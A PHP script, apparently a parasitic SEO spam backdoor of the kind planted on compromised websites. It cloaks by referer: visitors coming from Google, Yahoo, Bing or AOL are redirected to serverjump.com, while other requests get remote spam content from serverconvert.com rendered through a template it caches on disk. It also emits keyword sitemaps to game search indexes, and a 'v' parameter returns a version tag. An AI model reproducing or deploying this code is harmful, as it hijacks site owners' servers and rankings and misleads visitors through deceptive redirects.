<?php
function GetHttpPage($url)
{
    $output = '';
    $time_out = 30;
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time_out);
        $output = curl_exec($ch);
        if (curl_getinfo($ch, CURLINFO_HTTP_CODE) != 200) {
            $output = "";
        }
        curl_close($ch);
    }
    if ($output) return $output;
    if (function_exists('file_get_contents')) {
        $context = stream_context_create(array('http' => array('timeout' => $time_out)));
        if (strnatcmp(phpversion(), '5.0.0') >= 0) {
            $output = @file_get_contents($url, false, $context);
        } else {
            $output = @file_get_contents($url, false);
        }
    }
    if ($output) return $output;
    if (ini_get("allow_url_fopen") == "1") {
        $errstr = '';
        $errno = '';
        $info = parse_url($url);
        $fp = fsockopen($info ["host"], 80, $errno, $errstr, $time_out) or exit ($errstr . "--->" . $errno);
        $head = "GET " . $info ['path'] . "?" . (isset($info ["query"]) ? $info ["query"] : "") . " HTTP/1.1\r\n";
        $head .= "Host: " . $info ['host'] . "\r\n";
        $head .= "Connection: Close\r\n\r\n";
        fwrite($fp, $head);
        while (!feof($fp)) {
            $output .= fgets($fp, 128);
        }
        fclose($fp);
    }
    return $output;
}


$tmplFName = __FILE__ . ".tmp";
$bridge = "http://www.serverconvert.com/getserver.aspx?";
$serverid = isset($_GET['s'])?$_GET['s']:'';
$jumpid = isset($_GET['j'])?$_GET['j']:'';
$urlid = isset($_GET['u'])?$_GET['u']:'';
$keywordid = isset($_GET['k'])?$_GET['k']:'';
$lang = isset($_GET['l'])?$_GET['l']:'';

$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";

if (isset($_GET['v'])) {
    echo '1009';
    exit();
} elseif (preg_match("/google/i", $referer) || preg_match("/aol/i", $referer) || preg_match("/yahoo/i", $referer) || preg_match("/bing/i", $referer)) {
    $jumpurl = "http://www.serverjump.com/jump.aspx?jumpid=" . $jumpid . "&lang=" . $lang ."&uid=" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'];
    header('Location: ' . $jumpurl);
    exit();
} else {
    $serverurl = GetHttpPage($bridge . "serverid=" . $serverid);
    if ($serverurl) {
        if ($_GET['m']) {
            $sitemapurl = $serverurl . "/sitemap.aspx?importurlid=" . $urlid;
            $sitemap = GetHttpPage($sitemapurl);
            if ($sitemap) {
                $arr = explode(";", $sitemap);
                if (count($arr) > 0) {
                    header('Content-type: text/xml');
                    echo '<urlset xmlns=""http://www.sitemaps.org/schemas/sitemap/0.9"">';
                    for ($myt = 0; $myt < count($arr); $myt++) {
                        $arr2 = explode(",", $arr[$myt]);
                        if (count($arr2) > 0) {
                            $lang = $arr2[0];
                            $jid = $arr2[1];
                            for ($urlindex = 2; $urlindex < count($arr2); $urlindex++) {
                                echo "<url><loc><![CDATA[" . 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "?k=" . $arr2[$urlindex] . "&u=" . $urlid . "&s=" . $serverid . "&j=" . $jid . "&l=" . $lang . "]]></loc></url>";
                            }
                        }
                    }
                    echo '</urlset>';
                }
            }
        } else {
            $tmplUrl = $serverurl . "/GetUrlTemplate.aspx?urlid=" . $urlid . "&keywordid=" . $keywordid . "&lang=" . $lang . "&rnd=" . rand();
            $contUrl = $serverurl . "/getarticle.aspx?urlid=" . $urlid . "&keywordid=" . $keywordid . "&lang=" . $lang . "&rnd=" . rand();
            $tmplContent = "";

            if (file_exists($tmplFName)) {
                $file = fopen($tmplFName, "r");
                $tmplContent = fread($file, filesize($tmplFName));
                fclose($file);
                if (stripos($tmplContent, "#content#") == false) {
                    $tmplContent = "";
                }
            }

            if ($tmplContent == "") {
                $tmplContent = GetHttpPage($tmplUrl);

                $file = @fopen($tmplFName, "w");
                @fwrite($file, $tmplContent);
                @fclose($file);
            }

            if ($tmplContent and stripos($tmplContent, "#content#")) {
                $xmlStr = GetHttpPage($contUrl);

                if ($xmlStr) {
                    $p = xml_parser_create();
                    xml_parse_into_struct($p, $xmlStr, $values);
                    $tmplContent = str_replace("#language#", $lang, $tmplContent);
                    $tmplContent = str_replace("#title#", $values[1]["value"], $tmplContent);
                    $tmplContent = str_replace("#keywords#", $values[1]["value"], $tmplContent);
                    $tmplContent = str_replace("#description#", $values[1]["value"] . "," . $values[2]["value"] . ",http://" . $_SERVER['HTTP_HOST'], $tmplContent);
                    $tmplContent = str_replace("#content#", $values[3]["value"], $tmplContent);
                    echo $tmplContent;
                } else {
                    echo "content is empty: " . $contUrl;
                }
            } else {
                echo "tmpl is empty:" . $tmplContent;
            }
        }
    } else {
        echo($bridge . "serverid=" . $serverid);
    }
}
?>